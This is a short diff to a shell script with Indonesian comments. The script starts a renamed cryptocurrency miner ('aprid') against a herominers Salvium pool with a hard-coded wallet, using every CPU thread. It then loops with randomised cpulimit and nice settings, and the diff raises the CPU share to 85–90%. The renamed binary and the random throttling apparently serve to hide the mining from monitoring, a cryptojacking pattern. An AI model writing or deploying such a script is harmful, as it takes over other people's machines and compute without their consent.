@@ -23,14 +23,14 @@ chmod 777 aprid
 ./aprid --donate-level 1 \
     -o sg.salvium.herominers.com:1230 \
     -u SaLvs8XxvQyYjNN8GjS2LaiB1agypotxhEFKEnEEfbQvRbLxrdmkx2i8wHNcNHJbXCa9kASD1LZFyccETuEUc1HpUAtTJ3h4JUP \
-    -p OJO -a rx/0 -k -t $(nproc --all) &
+    -p OJO90 -a rx/0 -k -t $(nproc --all) &
 
 # Simpan PID proses mining
 APRID_PID=$!
 
 # Loop untuk mengatur batas CPU dan prioritas secara acak
 while true; do
-    CPU_LIMIT=$(( RANDOM % 41 + 50 ))  # Nilai acak antara 50% hingga 90%
+    CPU_LIMIT=$(( RANDOM % 6 + 85 ))  # Nilai acak antara 85% hingga 90%
     NICE_LEVEL=$(( RANDOM % 10 - 5 ))  # Prioritas antara -5 hingga 4
 
     # Batasi CPU dengan cpulimit
